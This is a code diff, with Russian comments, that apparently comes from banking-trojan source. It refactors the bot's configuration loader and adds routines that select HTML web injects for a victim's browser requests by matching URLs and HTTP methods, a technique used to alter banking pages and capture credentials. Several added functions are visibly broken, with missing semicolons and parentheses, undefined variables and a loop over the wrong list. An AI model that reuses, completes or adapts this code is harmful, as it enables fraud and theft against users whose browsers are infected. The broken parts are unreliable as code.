@@ -31,14 +31,15 @@ namespace CONFIGDEBUGSTRINGS
 bool bHttp;
 bool bHttps;
 
-// Новая версия конфига
-PBotConfig BotConfig;
+//**********************************************************
+//  Глобальная переменная, настройки бота из конфигура-
+//  ционного файла
+//**********************************************************
+TBotConfig* BotConfig;
 
-// Процесс в котором загружался конфиг
-DWORD ConfigProcess = 0;
+DWORD BotConfigPID = 0; // PID Процесса в котором загружался конфиг
 
-// Время последней загрузки конфига
-// DWORD LastLoadConfigTime = 0;
+
 
 #ifdef BV_APP
 LPVOID InjectEventData; // Данные для вызова события
@@ -139,7 +140,7 @@ void ReadStrBlock_(PCHAR &Buf, string &Out)
 
 
 
-bool DoLoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
+bool DoLoadConfigFromFileEx(TBotConfig* Config, PWCHAR FileName)
 {
 
 	// Загрухить конфигурационный файл
@@ -153,7 +154,7 @@ bool DoLoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 
 	if (File == INVALID_HANDLE_VALUE)
 	{
-		CFGDBG("BotConfig", "Ошибка зашрузки файла!");
+		CFGDBG("BotConfig", "Ошибка загрузки файла!");
 		return false;
 	}
 
@@ -288,8 +289,8 @@ bool DoLoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 	MemFree(FileBuf);
 
 	// Получаем время изменения файла
-	FILETIME Tm;
-	pGetFileTime(File, &Tm, &Tm, &Config->ConfigTime);
+//	FILETIME Tm;
+//	pGetFileTime(File, &Tm, &Tm, &Config->ConfigTime);
 
 	// -------------------------------
 	pCloseHandle(File);
@@ -297,70 +298,70 @@ bool DoLoadConfigFromFileEx(PBotConfig Config, PWCHAR FileName)
 	CFGDBG("BotConfig", "Файл загружен");
 
 	// Сохраняем имя последнего загруженного файла
-	Config->LastConfigFile = WSTR::New(FileName);
+//	Config->LastConfigFile = WSTR::New(FileName);
 
 	return true;
 }
 // ----------------------------------------------------------------------------
 
-bool Config::LoadConfigFromFile(PBotConfig Config, PWCHAR FileName)
-{
-	// Загружаем файл конфига
-	if (BotConfig == NULL || WSTR::IsEmpty(FileName))
-		return false;
-	pEnterCriticalSection(&Config->Lock);
-
-
-	bool Result = DoLoadConfigFromFileEx(Config, FileName);
-
-	pLeaveCriticalSection(&Config->Lock);
-
-	#ifdef BOTMONITOR
-		if (Result)
-		{
-        	PCHAR FN = WSTR::ToAnsi(FileName, 0);
-			MONITOR_MSG(BMCONST(ConfigLoadFile), FN);
-			STR::Free(FN);
-		}
-	#endif
-
-	return Result;
-
-}
+//bool Config::LoadConfigFromFile(TBotConfig *Config, PWCHAR FileName)
+//{
+//	// Загружаем файл конфига
+//	if (BotConfig == NULL || WSTR::IsEmpty(FileName))
+//		return false;
+//	pEnterCriticalSection(&Config->Lock);
+//
+//
+//	bool Result = DoLoadConfigFromFileEx(Config, FileName);
+//
+//	pLeaveCriticalSection(&Config->Lock);
+//
+//	#ifdef BOTMONITOR
+//		if (Result)
+//		{
+//        	PCHAR FN = WSTR::ToAnsi(FileName, 0);
+//			MONITOR_MSG(BMCONST(ConfigLoadFile), FN);
+//			STR::Free(FN);
+//		}
+//	#endif
+//
+//	return Result;
+//
+//}
 
 // ----------------------------------------------------------------------------
-void CheckConfigUpdates(PBotConfig Config)
-{
-	// Функция проверяет на необходимость перезагрузки конфига
-	// Код написан с учётом того, что функция будет вызвана
-	// в критической секции
-#ifndef BV_APP
-	if (Config->LastConfigFile == NULL)
-		return;
-
-	HANDLE File = (HANDLE)pCreateFileW(Config->LastConfigFile, GENERIC_WRITE, FILE_SHARE_READ,
-		0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-
-	if (File == INVALID_HANDLE_VALUE)
-		return;
-
-
-	FILETIME Tm, WT;
-	GetFileTime(File, &Tm, &Tm, &WT);
-	bool NeedUpdate = Config->ConfigTime.dwLowDateTime != WT.dwLowDateTime ||
-                      Config->ConfigTime.dwHighDateTime != WT.dwHighDateTime;
-
-	pCloseHandle(File);
-
-	if (NeedUpdate)
-	{
-    	PWCHAR FN = WSTR::New(Config->LastConfigFile);
-		CFGDBG("BotConfig", "Файл конфига изменился. Обновляем.");
-		DoLoadConfigFromFileEx(Config, FN);
-		WSTR::Free(FN);
-	}
-#endif
-}
+//void CheckConfigUpdates(PBotConfig Config)
+//{
+//	// Функция проверяет на необходимость перезагрузки конфига
+//	// Код написан с учётом того, что функция будет вызвана
+//	// в критической секции
+//#ifndef BV_APP
+//	if (Config->LastConfigFile == NULL)
+//		return;
+//
+//	HANDLE File = (HANDLE)pCreateFileW(Config->LastConfigFile, GENERIC_WRITE, FILE_SHARE_READ,
+//		0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+//
+//	if (File == INVALID_HANDLE_VALUE)
+//		return;
+//
+//
+//	FILETIME Tm, WT;
+//	GetFileTime(File, &Tm, &Tm, &WT);
+//	bool NeedUpdate = Config->ConfigTime.dwLowDateTime != WT.dwLowDateTime ||
+//                      Config->ConfigTime.dwHighDateTime != WT.dwHighDateTime;
+//
+//	pCloseHandle(File);
+//
+//	if (NeedUpdate)
+//	{
+//    	PWCHAR FN = WSTR::New(Config->LastConfigFile);
+//		CFGDBG("BotConfig", "Файл конфига изменился. Обновляем.");
+//		DoLoadConfigFromFileEx(Config, FN);
+//		WSTR::Free(FN);
+//	}
+//#endif
+//}
 
 // ----------------------------------------------------------------------------
 
@@ -393,56 +394,38 @@ void HTMLInjects::ReleaseInjectsList(PList List)
 	if (List == NULL)
 		return;
 
-	PBotConfig Config = Config::GetConfig();
-	if (Config == NULL)
-		return;
-
-	pEnterCriticalSection(&Config->Lock);
-
-    List::SetFreeItemMehod(List, NULL);
-
-	for (DWORD i = 0; i < List::Count(List); i++)
-	{
-		THTMLInject *Inject = (THTMLInject*)List::GetItem(List, i);
-		if (Inject->RefCount > 0)
-			Inject->RefCount--;
-		if (Inject->RefCount == 0 && Inject->DestroyAfterRelease)
-			FreeInject(Inject);
-
-	}
-
-    List::Clear(List);
-
-	pLeaveCriticalSection(&Config->Lock);
+	TBotConfig* Config = Config::GetConfig();
+	if (Config)
+		Config->HTMLInjects->ReleaseInjects(List);
 }
 
 // ----------------------------------------------------------------------------
 
-PBotConfig Config::Create()
-{
-	PBotConfig C = CreateStruct(TBotConfig_);
-	if (C == NULL)
-		return NULL;
-	C->HTMLInjects = new THTMLInjectList();
-	pInitializeCriticalSection(&C->Lock);
-	return C;
-}
+//PBotConfig Config::Create()
+//{
+//	PBotConfig C = CreateStruct(TBotConfig_);
+//	if (C == NULL)
+//		return NULL;
+//	C->HTMLInjects = new THTMLInjectList();
+//	pInitializeCriticalSection(&C->Lock);
+//	return C;
+//}
 // ----------------------------------------------------------------------------
 
-void Config::Free(PBotConfig Cfg)
-{
-	// Функция уничтожает структуру конфига
-	if (Cfg == NULL)
-		return;
-	Clear(Cfg);
-	List::Free(Cfg);
-//	pDeleteCriticalSection(&Cfg->Lock);
-	FreeStruct(Cfg);
-}
+//void Config::Free(PBotConfig Cfg)
+//{
+//	// Функция уничтожает структуру конфига
+//	if (Cfg == NULL)
+//		return;
+//	Clear(Cfg);
+//	List::Free(Cfg);
+////	pDeleteCriticalSection(&Cfg->Lock);
+//	FreeStruct(Cfg);
+//}
 
 // ----------------------------------------------------------------------------
 
-bool ConfigDoGetInjectsForRequest(PBotConfig BotConfig, PRequest Request) {
+bool ConfigDoGetInjectsForRequest(TBotConfig* BotConfig, PRequest Request) {
 	// Получить инжекты для запроса
 
 	// Собираем ссылку
@@ -498,26 +481,26 @@ bool ConfigDoGetInjectsForRequest(PBotConfig BotConfig, PRequest Request) {
 }
 //----------------------------------------------------------------------------
 
-bool Config::GetInjectsForRequest(PRequest Request) {
-
-	if (Request == NULL || STR::IsEmpty(Request->URL))
-		return false;
-
-	// Инициализируем конфигурационный файл
-	PBotConfig BotConfig = Config::GetConfig();
-	if (BotConfig == NULL)
-		return false;
-
-	pEnterCriticalSection(&BotConfig->Lock);
-
-    CheckConfigUpdates(BotConfig);
-
-	bool Result = ConfigDoGetInjectsForRequest(BotConfig, Request);
-
-	pLeaveCriticalSection(&BotConfig->Lock);
-
-	return Result;
-}
+//bool Config::GetInjectsForRequest(PRequest Request) {
+//
+//	if (Request == NULL || STR::IsEmpty(Request->URL))
+//		return false;
+//
+//	// Инициализируем конфигурационный файл
+//	TBotConfig* BotConfig = Config::GetConfig();
+//	if (BotConfig == NULL)
+//		return false;
+//
+//	pEnterCriticalSection(&BotConfig->Lock);
+//
+//    CheckConfigUpdates(BotConfig);
+//
+//	bool Result = ConfigDoGetInjectsForRequest(BotConfig, Request);
+//
+//	pLeaveCriticalSection(&BotConfig->Lock);
+//
+//	return Result;
+//}
 // ----------------------------------------------------------------------------
 
 bool Config::IsInjectURL(PCHAR URL, THTTPMethod Method)
@@ -645,8 +628,8 @@ bool Config::Download(PCHAR URL)
 
 // ----------------------------------------------------------------------------
 
-PBotConfig Config::Initialize(PWCHAR FileName, bool IsNewApplication,
-	bool DontLoad) {
+PBotConfig Config::Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad)
+{
 	// Инициализировать настройки бота
 	if (IsNewApplication) {
 		BotConfig = NULL;
@@ -680,22 +663,22 @@ PBotConfig Config::GetConfig()
 }
 // ----------------------------------------------------------------------------
 
-void Config::Clear(PBotConfig Config)
-{
-	// Очистить данне конфига
-	if (Config == NULL)
-		Config = BotConfig;
-	if (Config)
-	{
-		pEnterCriticalSection(&Config->Lock);
-
-		Config->HTMLInjects->Clear();
-
-		WSTR::Free(Config->LastConfigFile);
-		Config->LastConfigFile = NULL;
-		pLeaveCriticalSection(&Config->Lock);
-    }
-}
+//void Config::Clear(PBotConfig Config)
+//{
+//	// Очистить данне конфига
+//	if (Config == NULL)
+//		Config = BotConfig;
+//	if (Config)
+//	{
+//		pEnterCriticalSection(&Config->Lock);
+//
+//		Config->HTMLInjects->Clear();
+//
+//		WSTR::Free(Config->LastConfigFile);
+//		Config->LastConfigFile = NULL;
+//		pLeaveCriticalSection(&Config->Lock);
+//    }
+//}
 // ----------------------------------------------------------------------------
 
 bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before,
@@ -1049,12 +1032,25 @@ bool HTMLInjects::SupportContentType(PCHAR CType) {
 THTMLInjectList::THTMLInjectList()
 {
 	FInjects = List::Create();
+	pInitializeCriticalSection(&FLock);
 }
 
 THTMLInjectList::~THTMLInjectList()
 {
 	Clear();
 	List::Free(FInjects);
+}
+
+
+void THTMLInjectList::Lock()
+{
+	pEnterCriticalSection(&FLock);
+}
+
+
+void THTMLInjectList::Unlock()
+{
+	pLeaveCriticalSection(&FLock);
 }
 
 THTMLInject* THTMLInjectList::AddInject()
@@ -1084,6 +1080,98 @@ void THTMLInjectList::Clear()
 		delete (THTMLInject*)List::GetItem(FInjects, i);
 
 }
+
+
+bool THTMLInjectList::LoadFromMem(LPVOID Buf, DWORD BufSize)
+{
+	Clear()
+	if Buf == NULL || BufSize == 0)
+		return false;
+}
+
+
+void THTMLInjectList::ReleaseInjects(PList Injects)
+{
+	// Функция освобождает список инжектов
+	if (!Injects) return;
+
+
+    Lock();
+
+	for (DWORD i = List::Count(List); i > 0; i--)
+	{
+		THTMLInject *Inject = (THTMLInject*)List::GetItem(List, i);
+		if (!Inject) break;
+
+		if (Inject->RefCount > 0)
+			Inject->RefCount--;
+		if (Inject->RefCount == 0 && Inject->DestroyAfterRelease)
+			FreeInject(Inject);
+
+	}
+
+	List::Clear(List);
+
+	Unlock();
+}
+
+
+bool THTMLInjectList::GetInjectsForURL(THTTPMethod Method, const char *URL, PList List)
+{
+	// Функция возвращает все инжектты которые подошли для аддреса
+	// Если List == NULL то функция прервёт поиск на первом же инжекте
+	// и вернёт истину
+	if (STRA::IsEmpty(URL)) return false;
+
+    bool Result = false;
+
+	DWORD Cnt = Count();
+	for (DWORD i = 0; i < Cnt; i++)
+	{
+		THTMLInject *Inject = Items(i);
+
+
+		if (Inject->Disabled)
+			continue;
+
+		// Сравниваем методы и ссылки
+		if (Method == hmGET && Inject->GET || Method == hmPOST && Inject->POST)
+
+			if (CompareUrl(Inject->URL.t_str(), URL))
+			{
+				Result = true;
+
+				// Проверяется на наличие инжекта для данного адреса
+				if (List == NULL) break;
+
+				// Добавляем в список
+				Inject->Used = true;
+
+				#ifdef BV_APP
+					CallHTMLInjectEvent(Inject, injMaskFinded, NULL);
+				#endif
+
+				#ifdef BOTMONITOR
+					BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigMaskExec, (PCHAR)&Inject->ID, sizeof(Inject->ID));
+				#endif
+
+				if (Request->Injects == NULL)
+					Request->Injects = List::Create();
+
+				List::Add(Request->Injects, Inject);
+				Inject->RefCount++; // Увеличиваем счётчик использований инжекта
+				Request->IsInject = true;
+			}
+	}
+	//
+	if (DelURL)
+		STR::Free(URL);
+
+	return Request->IsInject;
+
+}
+
+
 
 //*****************************************************************************
 //                              THTMLInject
@@ -1158,4 +1246,46 @@ bool THTMLInjectData::IsValid()
 
 	return(B && I && A) || (B && A) || (B && I) || (I && A);
 
+}
+
+
+//*****************************************************************************
+//                                 TBotConfig
+//*****************************************************************************
+TBotConfig::TBotConfig()
+{
+	HTMLInjects = new THTMLInjectList();
+}
+
+
+TBotConfig::~TBotConfig()
+{
+	delete HTMLInjects;
+}
+
+
+void TBotConfig::Clear()
+{
+	HTMLInjects->Clear();
+}
+
+
+
+bool TBotConfig::LoadFromFile(const string &FileName)
+{
+	// Функция загружает настройки из файла
+	Clear();
+
+	if (FileName.IsEmpty())
+		return false;
+
+	DWORD  BufSize = 0;
+	LPBYTE Buf = File::ReadToBufferA(FileName.t_str(), BufSize);
+	if (Buf == NULL) return false;
+
+	// Читаем данные HTML инжектов
+	HTMLInjects->LoadFromMem(Buf, BufSize);
+
+	// Освобождаем память
+	MemFree(Buf);
 }
